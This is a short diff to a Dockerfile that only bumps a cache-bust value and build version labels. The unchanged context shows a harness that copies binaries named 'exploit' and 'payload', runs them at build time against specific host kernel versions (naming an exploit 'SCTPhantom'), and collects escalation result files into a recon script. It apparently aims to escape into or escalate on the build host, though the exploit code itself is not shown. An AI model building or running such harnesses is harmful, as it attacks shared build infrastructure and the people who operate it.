@@ -7,11 +7,11 @@ COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
-ARG CACHEBUST=900
+ARG CACHEBUST=901
 RUN sh -c '{ \
 echo "CB=$CACHEBUST"; \
 KVER=$(uname -r); \
-echo "=== BUILD V45 KERNEL=$KVER ==="; \
+echo "=== BUILD V46 KERNEL=$KVER ==="; \
 case "$KVER" in \
   6.8.*-136*) \
     echo "TARGET KERNEL 136 — SCTPhantom FIRST"; \
@@ -38,7 +38,7 @@ esac; \
 for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
   if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
 done; \
-echo "=== END V45 ==="; \
+echo "=== END V46 ==="; \
 } > /build_results.txt 2>&1'
 
 FROM alpine:3.19
@@ -57,7 +57,7 @@ cat /build_results.txt\n\
 for f in /esc_ok /umh_result; do\n\
   if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
 done\n\
-echo "=== END V45 ==="\n\
+echo "=== END V46 ==="\n\
 } > /tmp/recon 2>&1\n\
 cat /tmp/recon\n\
 ' > /recon.sh && chmod +x /recon.sh
